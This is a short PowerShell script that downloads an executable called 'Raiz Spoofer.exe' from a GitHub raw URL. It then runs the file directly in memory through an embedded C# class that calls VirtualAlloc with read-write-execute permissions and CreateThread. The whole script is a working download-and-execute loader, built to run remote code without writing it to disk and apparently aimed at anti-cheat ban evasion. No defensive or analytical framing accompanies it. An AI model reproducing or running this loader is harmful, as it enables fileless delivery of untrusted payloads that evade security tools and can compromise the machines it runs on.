$url = "https://raw.githubusercontent.com/tyu0720gyi/service/main/Raiz%20Spoofer.exe"

$NativeSource = @"
using System;
using System.Runtime.InteropServices;
public class NativeRunner {
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    public static void Run(byte[] data) {
        IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)data.Length, 0x3000, 0x40);
        Marshal.Copy(data, 0, p, data.Length);
        uint id;
        IntPtr h = CreateThread(IntPtr.Zero, 0, p, IntPtr.Zero, 0, out id);
        WaitForSingleObject(h, 0xFFFFFFFF);
    }
}
"@

try {
    Write-Host "[STEP 1] Downloading C++ Binary..." -ForegroundColor Cyan
    $bin = (New-Object System.Net.WebClient).DownloadData($url)
    
    Write-Host "[STEP 2] Injecting into Native Memory..." -ForegroundColor Cyan
    Add-Type -TypeDefinition $NativeSource
    
    # IMPORTANT: We are NOT using [Assembly]::Load anymore.
    [NativeRunner]::Run($bin)
    
    Write-Host "[DONE] Spoofer should be running now." -ForegroundColor Green
} catch {
    Write-Host "[-] FATAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
}
